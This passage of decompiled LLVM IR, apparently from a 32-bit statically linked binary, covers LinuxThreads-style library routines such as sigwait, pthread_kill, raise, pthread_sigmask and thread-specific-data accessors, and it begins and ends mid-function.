  %v0_8056dd7 = load i32, i32* @edi, align 4
  %v0_8056dd8 = load i32, i32* @esi, align 4
  %v0_8056dd9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056df5 = load i32, i32* @global_var_8073c88.687, align 8
  %v12_8056df5 = icmp eq i32 %v1_8056df5, %arg1
  br i1 %v12_8056df5, label %dec_label_pc_8056e9f, label %dec_label_pc_8056e01

dec_label_pc_8056e01:                             ; preds = %entry
  %v1_8056e01 = load i32, i32* @global_var_8073c8c.671, align 4
  %v12_8056e01 = icmp eq i32 %v1_8056e01, %arg1
  br i1 %v12_8056e01, label %dec_label_pc_8056e9f, label %dec_label_pc_8056e0d

dec_label_pc_8056e0d:                             ; preds = %dec_label_pc_8056e01
  %v1_8056e0d = load i32, i32* @global_var_8073c90.665, align 16
  %v12_8056e0d = icmp eq i32 %v1_8056e0d, %arg1
  %v1_8056e13 = icmp eq i1 %v12_8056e0d, false
  br i1 %v1_8056e13, label %dec_label_pc_8056e1d, label %dec_label_pc_8056e15

dec_label_pc_8056e15:                             ; preds = %dec_label_pc_8056e0d
  %tmp22 = icmp slt i32 %arg1, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8056e9f, label %dec_label_pc_8056e1d

dec_label_pc_8056e1d:                             ; preds = %dec_label_pc_8056e15, %dec_label_pc_8056e0d
  %v1_8056e1f = icmp eq i32* %arg2, null
  %.pre = ptrtoint i32* %stack_var_-156 to i32
  br i1 %v1_8056e1f, label %dec_label_pc_8056e1d.dec_label_pc_8056e68_crit_edge, label %dec_label_pc_8056e23

dec_label_pc_8056e1d.dec_label_pc_8056e68_crit_edge: ; preds = %dec_label_pc_8056e1d
  br label %dec_label_pc_8056e68

dec_label_pc_8056e23:                             ; preds = %dec_label_pc_8056e1d
  store i32 %.pre, i32* @esi, align 4
  %v3_8056e2f = bitcast i32* %stack_var_-156 to i16*
  %v4_8056e2f = call i32 @memcpy(i16* %v3_8056e2f, i32 %tmp9, i32 140)
  %v2_8056e37 = load i32, i32* %arg2, align 4
  %tmp25 = or i32 %v2_8056e37, 1
  %tmp26 = icmp eq i32 %tmp25, 1
  br i1 %tmp26, label %dec_label_pc_8056e64, label %dec_label_pc_8056e3c

dec_label_pc_8056e3c:                             ; preds = %dec_label_pc_8056e23
  %tmp24 = icmp slt i32 %arg1, 1
  br i1 %tmp24, label %dec_label_pc_8056e64, label %dec_label_pc_8056e40

dec_label_pc_8056e40:                             ; preds = %dec_label_pc_8056e3c
  %v1_8056e40 = add i32 %arg1, -64
  %v3_8056e40 = sub i32 63, %arg1
  %v4_8056e40 = and i32 %v3_8056e40, %arg1
  %v5_8056e40 = icmp slt i32 %v4_8056e40, 0
  %v6_8056e40 = icmp eq i32 %v1_8056e40, 0
  %v7_8056e40 = icmp slt i32 %v1_8056e40, 0
  %v3_8056e43 = icmp eq i1 %v7_8056e40, %v5_8056e40
  %v4_8056e43 = icmp eq i1 %v6_8056e40, false
  %v5_8056e43 = and i1 %v4_8056e43, %v3_8056e43
  br i1 %v5_8056e43, label %dec_label_pc_8056e64, label %dec_label_pc_8056e45

dec_label_pc_8056e45:                             ; preds = %dec_label_pc_8056e40
  %v1_8056e45 = add i32 %tmp9, 132
  %v2_8056e45 = inttoptr i32 %v1_8056e45 to i8*
  %v3_8056e45 = load i8, i8* %v2_8056e45, align 1
  %v4_8056e45 = and i8 %v3_8056e45, 4
  %v5_8056e45 = icmp eq i8 %v4_8056e45, 0
  %. = select i1 %v5_8056e45, i32 134573438, i32 134573364
  store i32 %., i32* %stack_var_-156, align 4
  br label %dec_label_pc_8056e68

dec_label_pc_8056e64:                             ; preds = %dec_label_pc_8056e40, %dec_label_pc_8056e3c, %dec_label_pc_8056e23
  br label %dec_label_pc_8056e68

dec_label_pc_8056e68:                             ; preds = %dec_label_pc_8056e1d.dec_label_pc_8056e68_crit_edge, %dec_label_pc_8056e45, %dec_label_pc_8056e64
  %v0_8056e6a = phi i32 [ 0, %dec_label_pc_8056e1d.dec_label_pc_8056e68_crit_edge ], [ %.pre, %dec_label_pc_8056e45 ], [ %.pre, %dec_label_pc_8056e64 ]
  %v3_8056e6c = inttoptr i32 %v0_8056e6a to i32*
  %v4_8056e6c = call i32 @__libc_sigaction(i32 %arg1, i32* %v3_8056e6c, i32 %.pre)
  store i32 -1, i32* @edx, align 4
  %v8_8056e77 = icmp eq i32 %v4_8056e6c, -1
  br i1 %v8_8056e77, label %dec_label_pc_8056ea8, label %dec_label_pc_8056e7a

dec_label_pc_8056e7a:                             ; preds = %dec_label_pc_8056e68
  %v1_8056e7a = add i32 %arg1, -1
  %v6_8056e80 = icmp ugt i32 %v1_8056e7a, 63
  br i1 %v6_8056e80, label %dec_label_pc_8056ea6, label %dec_label_pc_8056e82

dec_label_pc_8056e82:                             ; preds = %dec_label_pc_8056e7a
  %v1_8056e82 = icmp eq i32 %arg3, 0
  br i1 %v1_8056e82, label %dec_label_pc_8056e90, label %dec_label_pc_8056e86

dec_label_pc_8056e86:                             ; preds = %dec_label_pc_8056e82
  %v1_8056e86 = mul i32 %arg1, 4
  %v2_8056e86 = add i32 %v1_8056e86, ptrtoint (i32* @global_var_80784e0.685 to i32)
  %v3_8056e86 = inttoptr i32 %v2_8056e86 to i32*
  %v4_8056e86 = load i32, i32* %v3_8056e86, align 4
  %v2_8056e8d = inttoptr i32 %arg3 to i32*
  store i32 %v4_8056e86, i32* %v2_8056e8d, align 4
  br label %dec_label_pc_8056e90

dec_label_pc_8056e90:                             ; preds = %dec_label_pc_8056e82, %dec_label_pc_8056e86
  br i1 %v1_8056e1f, label %dec_label_pc_8056ea6, label %dec_label_pc_8056e94

dec_label_pc_8056e94:                             ; preds = %dec_label_pc_8056e90
  %v2_8056e94 = load i32, i32* %arg2, align 4
  %v2_8056e96 = mul i32 %arg1, 4
  %v3_8056e96 = add i32 %v2_8056e96, ptrtoint (i32* @global_var_80784e0.685 to i32)
  %v4_8056e96 = inttoptr i32 %v3_8056e96 to i32*
  store i32 %v2_8056e94, i32* %v4_8056e96, align 4
  br label %dec_label_pc_8056ea6

dec_label_pc_8056e9f:                             ; preds = %dec_label_pc_8056e15, %dec_label_pc_8056e01, %entry
  store i32 22, i32* @edx, align 4
  br label %dec_label_pc_8056ea8

dec_label_pc_8056ea6:                             ; preds = %dec_label_pc_8056e90, %dec_label_pc_8056e7a, %dec_label_pc_8056e94
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8056ea8

dec_label_pc_8056ea8:                             ; preds = %dec_label_pc_8056e68, %dec_label_pc_8056e9f, %dec_label_pc_8056ea6
  %v0_8056eae = phi i32 [ -1, %dec_label_pc_8056e68 ], [ 22, %dec_label_pc_8056e9f ], [ 0, %dec_label_pc_8056ea6 ]
  store i32 %v0_8056dd9, i32* @ebx, align 4
  store i32 %v0_8056dd8, i32* @esi, align 4
  store i32 %v0_8056dd7, i32* @edi, align 4
  ret i32 %v0_8056eae

; uselistorder directives
  uselistorder i32 %v1_8056e40, { 1, 0 }
  uselistorder i32 %.pre, { 0, 3, 2, 1 }
  uselistorder i1 %v1_8056e1f, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg1, { 6, 10, 11, 9, 3, 8, 7, 4, 5, 0, 1, 2, 12 }
  uselistorder label %dec_label_pc_8056ea8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056ea6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056e90, { 1, 0 }
  uselistorder label %dec_label_pc_8056e68, { 2, 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-440 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %v0_8056eb5 = load i32, i32* @edi, align 4
  %v0_8056eb6 = load i32, i32* @esi, align 4
  %v0_8056eb7 = load i32, i32* @ebx, align 4
  store i32 1, i32* @esi, align 4
  %v3_8056ec3 = call i32 @thread_self.5(i32 %v0_8056eb7, i32 %v0_8056eb6, i32 %v0_8056eb5)
  store i32 %arg1, i32* @edi, align 4
  %v2_8056ed9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8056ed9, i32* @ebx, align 4
  %v1_8056ee1 = call i32 @sigfillset(i32 %v2_8056ed9)
  %v1_8056eef = call i32 @__GI_sigdelset(i32 %v2_8056ed9)
  %v0_8056f7e.pr = load i32, i32* @esi, align 4
  %v2_8056f4f = ptrtoint i32* %stack_var_-280 to i32
  %v2_8056f56 = ptrtoint i32* %stack_var_-284 to i32
  %v7_8056f8126 = icmp sgt i32 %v0_8056f7e.pr, 65
  br i1 %v7_8056f8126, label %dec_label_pc_8056f87, label %dec_label_pc_8056efc.lr.ph

dec_label_pc_8056efc.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8056efc

dec_label_pc_8056efc:                             ; preds = %dec_label_pc_8056efc.lr.ph, %dec_label_pc_8056f7d
  %v0_8056efe28 = phi i32 [ %v0_8056f7e.pr, %dec_label_pc_8056efc.lr.ph ], [ %v1_8056f7d, %dec_label_pc_8056f7d ]
  %v3_8056f0027 = phi i32 [ %v1_8056eef, %dec_label_pc_8056efc.lr.ph ], [ %v0_8056f872, %dec_label_pc_8056f7d ]
  %v0_8056eff = load i32, i32* @edi, align 4
  %v4_8056f00 = call i32 @sigismember(i32 %v0_8056eff, i32 %v0_8056efe28, i32 %v3_8056f0027, i32 %v3_8056f0027)
  %v1_8056f08 = icmp eq i32 %v4_8056f00, 0
  br i1 %v1_8056f08, label %dec_label_pc_8056f7d, label %dec_label_pc_8056f0c

dec_label_pc_8056f0c:                             ; preds = %dec_label_pc_8056efc
  %v0_8056f0c = load i32, i32* @esi, align 4
  %v1_8056f0c = load i32, i32* @global_var_8073c88.687, align 8
  %v12_8056f0c = icmp eq i32 %v0_8056f0c, %v1_8056f0c
  br i1 %v12_8056f0c, label %dec_label_pc_8056f7d, label %dec_label_pc_8056f14

dec_label_pc_8056f14:                             ; preds = %dec_label_pc_8056f0c
  %v1_8056f14 = load i32, i32* @global_var_8073c8c.671, align 4
  %v12_8056f14 = icmp eq i32 %v0_8056f0c, %v1_8056f14
  br i1 %v12_8056f14, label %dec_label_pc_8056f7d, label %dec_label_pc_8056f1c

dec_label_pc_8056f1c:                             ; preds = %dec_label_pc_8056f14
  %v1_8056f1c = load i32, i32* @global_var_8073c90.665, align 16
  %v12_8056f1c = icmp eq i32 %v0_8056f0c, %v1_8056f1c
  br i1 %v12_8056f1c, label %dec_label_pc_8056f7d, label %dec_label_pc_8056f24

dec_label_pc_8056f24:                             ; preds = %dec_label_pc_8056f1c
  %v1_8056f2f = call i32 @__GI_sigdelset(i32 %v2_8056ed9)
  %v0_8056f37 = load i32, i32* @esi, align 4
  %v1_8056f37 = mul i32 %v0_8056f37, 4
  %v2_8056f37 = add i32 %v1_8056f37, ptrtoint (i32* @global_var_80784e0.685 to i32)
  %v3_8056f37 = inttoptr i32 %v2_8056f37 to i32*
  %v4_8056f37 = load i32, i32* %v3_8056f37, align 4
  %tmp29 = or i32 %v4_8056f37, 1
  %tmp30 = icmp eq i32 %tmp29, 1
  br i1 %tmp30, label %dec_label_pc_8056f41, label %dec_label_pc_8056f7d

dec_label_pc_8056f41:                             ; preds = %dec_label_pc_8056f24
  store i32 ptrtoint (i32* @global_var_8056cf4.688 to i32), i32* %stack_var_-284, align 4
  store i32 %v2_8056f56, i32* @ebx, align 4
  %v1_8056f5e = call i32 @sigemptyset(i32 %v2_8056f4f)
  %v0_8056f74 = load i32, i32* @esi, align 4
  %v4_8056f75 = call i32 @__GI_sigaction(i32 %v0_8056f74, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_8056f7d

dec_label_pc_8056f7d:                             ; preds = %dec_label_pc_8056f24, %dec_label_pc_8056f1c, %dec_label_pc_8056f14, %dec_label_pc_8056f0c, %dec_label_pc_8056efc, %dec_label_pc_8056f41
  %v0_8056f872 = phi i32 [ %v1_8056f2f, %dec_label_pc_8056f24 ], [ %v4_8056f00, %dec_label_pc_8056f1c ], [ %v4_8056f00, %dec_label_pc_8056f14 ], [ %v4_8056f00, %dec_label_pc_8056f0c ], [ 0, %dec_label_pc_8056efc ], [ %v4_8056f75, %dec_label_pc_8056f41 ]
  %v0_8056f7d = load i32, i32* @esi, align 4
  %v1_8056f7d = add i32 %v0_8056f7d, 1
  store i32 %v1_8056f7d, i32* @esi, align 4
  %v7_8056f81 = icmp sgt i32 %v1_8056f7d, 65
  br i1 %v7_8056f81, label %dec_label_pc_8056f87, label %dec_label_pc_8056efc

dec_label_pc_8056f87:                             ; preds = %dec_label_pc_8056f7d, %entry
  %v2_8056f8b = ptrtoint i32* %stack_var_-440 to i32
  %v3_8056f90 = call i32 @__sigsetjmp(i32 %v2_8056f8b, i32* inttoptr (i32 1 to i32*))
  %v1_8056f98 = icmp eq i32 %v3_8056f90, 0
  %v1_8056f9a = icmp eq i1 %v1_8056f98, false
  br i1 %v1_8056f9a, label %dec_label_pc_8056f87.dec_label_pc_8056ff0_crit_edge, label %dec_label_pc_8056f9c

dec_label_pc_8056f87.dec_label_pc_8056ff0_crit_edge: ; preds = %dec_label_pc_8056f87
  %.pre = add i32 %v3_8056ec3, 40
  %.pre3 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_8056ff0

dec_label_pc_8056f9c:                             ; preds = %dec_label_pc_8056f87
  %v2_8056fa7 = add i32 %v3_8056ec3, 40
  %v3_8056fa7 = inttoptr i32 %v2_8056fa7 to i32*
  store i32 %v2_8056f8b, i32* %v3_8056fa7, align 4
  %v1_8056fb1 = add i32 %v3_8056ec3, 66
  %v2_8056fb1 = inttoptr i32 %v1_8056fb1 to i8*
  %v3_8056fb1 = load i8, i8* %v2_8056fb1, align 1
  %v4_8056fb1 = icmp eq i8 %v3_8056fb1, 0
  br i1 %v4_8056fb1, label %dec_label_pc_8056fc4, label %dec_label_pc_8056fb7

dec_label_pc_8056fb7:                             ; preds = %dec_label_pc_8056f9c
  %v1_8056fbe = add i32 %v3_8056ec3, 64
  %v2_8056fbe = inttoptr i32 %v1_8056fbe to i8*
  %v3_8056fbe = load i8, i8* %v2_8056fbe, align 1
  %v4_8056fbe = icmp eq i8 %v3_8056fbe, 0
  br i1 %v4_8056fbe, label %dec_label_pc_8056ff0, label %dec_label_pc_8056fc4

dec_label_pc_8056fc4:                             ; preds = %dec_label_pc_8056fb7, %dec_label_pc_8056f9c
  %v1_8056fcb = add i32 %v3_8056ec3, 32
  %v2_8056fcb = inttoptr i32 %v1_8056fcb to i32*
  store i32 0, i32* %v2_8056fcb, align 4
  %v1_8056fdc = add i32 %v3_8056ec3, 88
  %v2_8056fdc = inttoptr i32 %v1_8056fdc to i8*
  store i8 1, i8* %v2_8056fdc, align 1
  %v1_8056fe8 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_8056fe8 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_8056fe8)
  br label %dec_label_pc_8056ff0

dec_label_pc_8056ff0:                             ; preds = %dec_label_pc_8056f87.dec_label_pc_8056ff0_crit_edge, %dec_label_pc_8056fb7, %dec_label_pc_8056fc4
  %v2_8056ff7.pre-phi = phi i32* [ %.pre3, %dec_label_pc_8056f87.dec_label_pc_8056ff0_crit_edge ], [ %v3_8056fa7, %dec_label_pc_8056fb7 ], [ %v3_8056fa7, %dec_label_pc_8056fc4 ]
  store i32 0, i32* %v2_8056ff7.pre-phi, align 4
  %v0_8056ffe = call i32 @pthread_testcancel()
  %v1_8057011 = add i32 %v3_8056ec3, 32
  %v2_8057011 = inttoptr i32 %v1_8057011 to i32*
  %v3_8057011 = load i32, i32* %v2_8057011, align 4
  store i32 %v3_8057011, i32* %arg2, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8056f7d, { 0, 2, 1 }
  uselistorder i32 %v4_8056f00, { 3, 2, 1, 0 }
  uselistorder i32 %v3_8056f0027, { 1, 0 }
  uselistorder i32 %v3_8056ec3, { 6, 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @thread_self.5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056ff0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056f7d, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8056efc, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8057022 = load i32, i32* @esi, align 4
  %v0_8057023 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805702f = urem i32 %arg1, 1024
  %v2_8057034 = mul nuw nsw i32 %v1_805702f, 16
  %v1_8057037 = add i32 %v2_8057034, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_8057037, i32* @esi, align 4
  store i32 %v1_8057037, i32* @eax, align 4
  %v1_805703f = call i32 @__pthread_lock(i32 %v0_8057023)
  %v0_8057044 = load i32, i32* @esi, align 4
  %v1_8057044 = add i32 %v0_8057044, 8
  %v2_8057044 = inttoptr i32 %v1_8057044 to i32*
  %v3_8057044 = load i32, i32* %v2_8057044, align 4
  %v1_8057047 = icmp eq i32 %v3_8057044, 0
  br i1 %v1_8057047, label %dec_label_pc_8057050, label %dec_label_pc_805704b

dec_label_pc_805704b:                             ; preds = %entry
  %v1_805704b = add i32 %v3_8057044, 16
  %v2_805704b = inttoptr i32 %v1_805704b to i32*
  %v3_805704b = load i32, i32* %v2_805704b, align 4
  %v4_805704b = load i32, i32* @ebx, align 4
  %v15_805704b = icmp eq i32 %v3_805704b, %v4_805704b
  br i1 %v15_805704b, label %dec_label_pc_8057063, label %dec_label_pc_8057050

dec_label_pc_8057050:                             ; preds = %dec_label_pc_805704b, %entry
  store i32 %v0_8057044, i32* %stack_var_-28, align 4
  %v1_8057054 = inttoptr i32 %v0_8057044 to i32*
  %v2_8057054 = call i32 @__pthread_unlock(i32* %v1_8057054)
  br label %dec_label_pc_805708a

dec_label_pc_8057063:                             ; preds = %dec_label_pc_805704b
  %v1_8057066 = add i32 %v3_8057044, 20
  %v2_8057066 = inttoptr i32 %v1_8057066 to i32*
  %v3_8057066 = load i32, i32* %v2_8057066, align 4
  store i32 %v3_8057066, i32* @ebx, align 4
  store i32 %v0_8057044, i32* %stack_var_-28, align 4
  %v1_805706a = inttoptr i32 %v0_8057044 to i32*
  %v2_805706a = call i32 @__pthread_unlock(i32* %v1_805706a)
  %v0_8057075 = load i32, i32* @ebx, align 4
  store i32 %v0_8057075, i32* %stack_var_-28, align 4
  %v2_8057076 = call i32 @kill(i32 %v0_8057075, i32 %arg2)
  %v8_8057080 = icmp eq i32 %v2_8057076, -1
  %v1_8057081 = icmp eq i1 %v8_8057080, false
  br i1 %v1_8057081, label %dec_label_pc_805708a, label %dec_label_pc_8057083

dec_label_pc_8057083:                             ; preds = %dec_label_pc_8057063
  %v0_8057083 = load i32, i32* %stack_var_-28, align 4
  %v1_8057083 = call i32 @__errno_location(i32 %v0_8057083)
  %v1_8057088 = inttoptr i32 %v1_8057083 to i32*
  %v2_8057088 = load i32, i32* %v1_8057088, align 4
  br label %dec_label_pc_805708a

dec_label_pc_805708a:                             ; preds = %dec_label_pc_8057063, %dec_label_pc_8057050, %dec_label_pc_8057083
  %v0_805708a = phi i32 [ 0, %dec_label_pc_8057063 ], [ 3, %dec_label_pc_8057050 ], [ %v2_8057088, %dec_label_pc_8057083 ]
  store i32 %v0_8057022, i32* @esi, align 4
  ret i32 %v0_805708a

; uselistorder directives
  uselistorder i32 %v0_8057044, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_805708a, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057090 = load i32, i32* @ebx, align 4
  store i32 %v0_8057090, i32* %stack_var_-4, align 4
  %v1_8057094 = call i32 @__GI_pthread_self(i32 %v0_8057090)
  %v0_8057099 = load i32, i32* @ebx, align 4
  store i32 %v1_8057094, i32* %stack_var_-28, align 4
  %v4_80570a0 = call i32 @pthread_kill(i32 %v1_8057094, i32 %arg1, i32 %v0_8057099, i32 %v0_8057099)
  %v1_80570ac = icmp eq i32 %v4_80570a0, 0
  br i1 %v1_80570ac, label %dec_label_pc_80570ba, label %dec_label_pc_80570b0

dec_label_pc_80570b0:                             ; preds = %entry
  %v0_80570b0 = load i32, i32* %stack_var_-28, align 4
  %v1_80570b0 = call i32 @__errno_location(i32 %v0_80570b0)
  %v2_80570b5 = inttoptr i32 %v1_80570b0 to i32*
  store i32 %v4_80570a0, i32* %v2_80570b5, align 4
  br label %dec_label_pc_80570ba

dec_label_pc_80570ba:                             ; preds = %entry, %dec_label_pc_80570b0
  %v0_80570bd = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_80570b0 ]
  %v2_80570bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80570bc, i32* @ebx, align 4
  ret i32 %v0_80570bd

; uselistorder directives
  uselistorder i32 %v1_8057094, { 1, 0 }
  uselistorder label %dec_label_pc_80570ba, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80570d4 = icmp eq i32 %arg2, 0
  br i1 %v1_80570d4, label %entry.dec_label_pc_8057146_crit_edge, label %dec_label_pc_80570d8

entry.dec_label_pc_8057146_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8057146

dec_label_pc_80570d8:                             ; preds = %entry
  %v2_80570d8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_80570d8, i32* @ebx, align 4
  store i32 %v2_80570d8, i32* %stack_var_-156, align 4
  %v3_80570e4 = bitcast i32* %stack_var_-136 to i16*
  %v4_80570e4 = call i32 @memcpy(i16* %v3_80570e4, i32 %arg2, i32 128)
  %v5_80570ec = icmp eq i32 %arg1, 0
  %v9_80570ec = icmp eq i32 %arg1, 1
  br i1 %v9_80570ec, label %dec_label_pc_805712d, label %dec_label_pc_80570f1

dec_label_pc_80570f1:                             ; preds = %dec_label_pc_80570d8
  %v9_80570f1 = icmp eq i32 %arg1, 2
  br i1 %v9_80570f1, label %dec_label_pc_80570fc, label %dec_label_pc_80570f6

dec_label_pc_80570f6:                             ; preds = %dec_label_pc_80570f1
  br i1 %v5_80570ec, label %dec_label_pc_805710e, label %dec_label_pc_8057142

dec_label_pc_80570fc:                             ; preds = %dec_label_pc_80570f1
  %v0_80570fe = load i32, i32* @global_var_8073c88.687, align 8
  store i32 %v2_80570d8, i32* %stack_var_-156, align 4
  %v2_8057105 = call i32 @__GI_sigaddset(i32 %v2_80570d8, i32 %v0_80570fe)
  br label %dec_label_pc_8057110

dec_label_pc_805710e:                             ; preds = %dec_label_pc_80570f6
  br label %dec_label_pc_8057110

dec_label_pc_8057110:                             ; preds = %dec_label_pc_80570fc, %dec_label_pc_805710e
  store i32 %v2_80570d8, i32* %stack_var_-156, align 4
  %v1_8057117 = call i32 @__GI_sigdelset(i32 %v2_80570d8)
  %v0_805711c = load i32, i32* @global_var_8073c90.665, align 16
  %tmp20 = icmp slt i32 %v0_805711c, 1
  br i1 %tmp20, label %dec_label_pc_8057142, label %dec_label_pc_8057128

dec_label_pc_8057128:                             ; preds = %dec_label_pc_8057110
  br label %dec_label_pc_8057135

dec_label_pc_805712d:                             ; preds = %dec_label_pc_80570d8
  br label %dec_label_pc_8057135

dec_label_pc_8057135:                             ; preds = %dec_label_pc_8057128, %dec_label_pc_805712d
  store i32 %v2_80570d8, i32* %stack_var_-156, align 4
  %v1_8057136 = call i32 @__GI_sigdelset(i32 %v2_80570d8)
  br label %dec_label_pc_8057146

dec_label_pc_8057142:                             ; preds = %dec_label_pc_80570f6, %dec_label_pc_8057110
  br label %dec_label_pc_8057146

dec_label_pc_8057146:                             ; preds = %entry.dec_label_pc_8057146_crit_edge, %dec_label_pc_8057135, %dec_label_pc_8057142
  %v0_805714e = phi i32 [ 0, %entry.dec_label_pc_8057146_crit_edge ], [ %v2_80570d8, %dec_label_pc_8057135 ], [ %v2_80570d8, %dec_label_pc_8057142 ]
  store i32 %arg1, i32* %stack_var_-156, align 4
  %v3_8057150 = inttoptr i32 %v0_805714e to %_TYPEDEF_sigset_t*
  %v4_8057150 = call i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v3_8057150, i32 %arg3)
  %v8_805715a = icmp eq i32 %v4_8057150, -1
  %v1_805715b = icmp eq i1 %v8_805715a, false
  br i1 %v1_805715b, label %dec_label_pc_8057164, label %dec_label_pc_805715d

dec_label_pc_805715d:                             ; preds = %dec_label_pc_8057146
  %v0_805715d = load i32, i32* %stack_var_-156, align 4
  %v1_805715d = call i32 @__errno_location(i32 %v0_805715d)
  %v1_8057162 = inttoptr i32 %v1_805715d to i32*
  %v2_8057162 = load i32, i32* %v1_8057162, align 4
  br label %dec_label_pc_8057164

dec_label_pc_8057164:                             ; preds = %dec_label_pc_8057146, %dec_label_pc_805715d
  %v0_805716a = phi i32 [ 0, %dec_label_pc_8057146 ], [ %v2_8057162, %dec_label_pc_805715d ]
  ret i32 %v0_805716a

; uselistorder directives
  uselistorder i32 %v2_80570d8, { 0, 1, 7, 6, 3, 2, 5, 4, 8, 9 }
  uselistorder i32 %arg1, { 3, 2, 0, 1, 4, 5 }
  uselistorder label %dec_label_pc_8057164, { 1, 0 }
  uselistorder label %dec_label_pc_8057146, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057142, { 1, 0 }
  uselistorder label %dec_label_pc_8057135, { 1, 0 }
  uselistorder label %dec_label_pc_8057110, { 1, 0 }
}

define i32 @thread_self.6(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8057177 = load i32, i32* @esp, align 4
  %v1_8057177 = load i32, i32* @global_var_807a620.650, align 32
  %v7_8057177 = icmp ult i32 %v0_8057177, %v1_8057177
  %v1_805717d = icmp eq i1 %v7_8057177, false
  br i1 %v1_805717d, label %dec_label_pc_80571ae, label %dec_label_pc_805717f

dec_label_pc_805717f:                             ; preds = %entry
  %v1_805717f = load i32, i32* @global_var_807a624.651, align 4
  %v7_805717f = icmp ult i32 %v0_8057177, %v1_805717f
  br i1 %v7_805717f, label %dec_label_pc_8057194, label %dec_label_pc_8057187

dec_label_pc_8057187:                             ; preds = %dec_label_pc_805717f
  %v1_805718c = load i32, i32* @global_var_807a628.653, align 8
  %v7_805718c = icmp ult i32 %v0_8057177, %v1_805718c
  br i1 %v7_805718c, label %dec_label_pc_80571ae, label %dec_label_pc_8057194

dec_label_pc_8057194:                             ; preds = %dec_label_pc_8057187, %dec_label_pc_805717f
  %v0_8057194 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8057194 = icmp eq i32 %v0_8057194, 0
  br i1 %v1_8057194, label %dec_label_pc_80571a2, label %dec_label_pc_805719d

dec_label_pc_805719d:                             ; preds = %dec_label_pc_8057194
  %v0_805719d = call i32 @__pthread_find_self()
  br label %dec_label_pc_80571a2

dec_label_pc_80571a2:                             ; preds = %dec_label_pc_8057194, %dec_label_pc_805719d
  %v2_80571a8 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80571ae

dec_label_pc_80571ae:                             ; preds = %dec_label_pc_8057187, %entry, %dec_label_pc_80571a2
  %v0_80571ae = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8057187 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_80571a8, %dec_label_pc_80571a2 ]
  ret i32 %v0_80571ae

; uselistorder directives
  uselistorder label %dec_label_pc_80571ae, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80571a2, { 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80571b2 = call i32 @thread_self.6(i32 ptrtoint (i32* @0 to i32))
  %v2_80571c0 = mul i32 %arg1, 4
  %v3_80571c0 = add i32 %v2_80571c0, 364
  %v4_80571c0 = add i32 %v3_80571c0, %v1_80571b2
  ret i32 %v4_80571c0
}

define i32 @__pthread_internal_tsd_get(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80571cb = call i32 @thread_self.6(i32 ptrtoint (i32* @0 to i32))
  %v2_80571d4 = mul i32 %arg1, 4
  %v3_80571d4 = add i32 %v2_80571d4, 364
  %v4_80571d4 = add i32 %v3_80571d4, %v1_80571cb
  %v5_80571d4 = inttoptr i32 %v4_80571d4 to i32*
  %v6_80571d4 = load i32, i32* %v5_80571d4, align 4
  ret i32 %v6_80571d4
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80571e2 = call i32 @thread_self.6(i32 ptrtoint (i32* @0 to i32))
  %v3_80571ef = mul i32 %arg1, 4
  %v4_80571ef = add i32 %v3_80571ef, 364
  %v5_80571ef = add i32 %v4_80571ef, %v1_80571e2
  %v6_80571ef = inttoptr i32 %v5_80571ef to i32*
  store i32 %arg2, i32* %v6_80571ef, align 4
  ret i32 0

; uselistorder directives
